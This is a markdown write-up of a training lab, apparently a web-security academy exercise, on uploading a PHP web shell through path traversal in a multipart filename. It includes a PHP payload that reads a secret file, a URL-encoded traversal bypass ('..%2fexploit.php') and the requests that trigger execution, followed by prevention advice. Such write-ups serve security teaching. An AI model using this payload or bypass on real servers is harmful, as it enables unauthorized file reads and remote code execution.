# 📂 Web Shell Upload — Path Traversal in File Upload

## 🎯 Objective
- Exploit path traversal in file upload functionality to:
  - Escape restricted upload directories
  - Place executable PHP files into executable paths
  - Achieve remote code execution
  - Retrieve sensitive server-side data

---

## ❗ Why This Matters

- Even when file uploads are allowed:
  - Storage path restrictions matter
  - Execution context matters
- Path traversal flaws can:
  - Relocate uploads
  - Bypass execution protections
  - Lead to full RCE

---

## 🧪 Exercises Performed

# 🔍 Part 1 — Baseline Upload Behavior

## 1️⃣ Legitimate Avatar Upload

### Observation:

- ✔️ Uploaded file accessible via:

  ```http
  /files/avatars/<uploaded-file>
  ```

---

### Security Insight:

```text 
Avatar directory serves files as static content
```

---

# 🚀 Part 2 — Malicious PHP Payload Creation

## 2️⃣ Payload File

### Filename:

```php 
exploit.php
```

---

### Payload:

```php 
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

### Purpose:

- ✔️ Read Carlos’s secret
- ✔️ Output file contents

---

# 🚀 Part 3 — Direct Upload Test

## 3️⃣ Upload PHP File

### Result:

- ✔️ Upload allowed

---

### Execution Attempt:

```http 
GET /files/avatars/exploit.php
```

---

### Observation:

- ❌ PHP source returned as plain text
- ❌ No code execution

---

## ⚠️ Vulnerability Insight

```text 
Upload location is non-executable, but upload restrictions are weak
```

---

# 🚀 Part 4 — Path Traversal in Filename

## 4️⃣ Modify Multipart Filename

### Original:

```http 
filename="exploit.php"
```

---

### First Attempt:

```http 
filename="../exploit.php"
```

---

### Result:

- ❌ Traversal stripped

---

# 🚀 Part 5 — URL Encoding Bypass

## 5️⃣ Obfuscated Traversal

```http 
filename="..%2fexploit.php"
```

---

### Result:

- ✔️ Server decodes path
- ✔️ Traversal preserved

---

### Upload Response:

```text 
avatars/../exploit.php
```

---

### Security Insight:

```text 
Server sanitizes raw traversal but decodes encoded traversal afterward
```

---

# 🚀 Part 6 — Trigger Web Shell

## 6️⃣ Access Traversed File

```http 
GET /files/avatars/..%2fexploit.php
```

---

### Equivalent Location:

```http
/files/exploit.php
```

---

### Outcome:

- ✔️ PHP executed
- ✔️ Carlos’s secret disclosed
- ✔️ Remote code execution achieved
- ✔️ Lab solved 🎉

---

## 🏁 Lab Completion

* Upload directory protections bypassed
* Traversal obfuscation successful
* PHP relocated to executable directory
* Web shell executed
* Sensitive data extracted

---

## 🧠 Key Takeaways

* Upload validation must include path normalization
* Encoding tricks often bypass filters
* Storage location security is critical
* Path traversal + upload = severe RCE
* Sanitization order matters greatly

---

## 🔥 Core Vulnerability

```text 
Improper filename path normalization allowed traversal into executable directory and enabled PHP web shell execution
```

---

## 🛡️ Prevention

* Normalize:

  * Filenames before validation
* Reject:

  * Traversal sequences
  * Encoded traversal
* Rename:

  * User uploads server-side
* Store:

  * Outside web root
* Disable:

  * Script execution
* Apply:

  * Canonical path enforcement

---

## ⚠️ Security Principle

```text 
If attackers control file paths, directory restrictions become optional
```

---

## 🏁 Status

- ✔️ Lab Completed
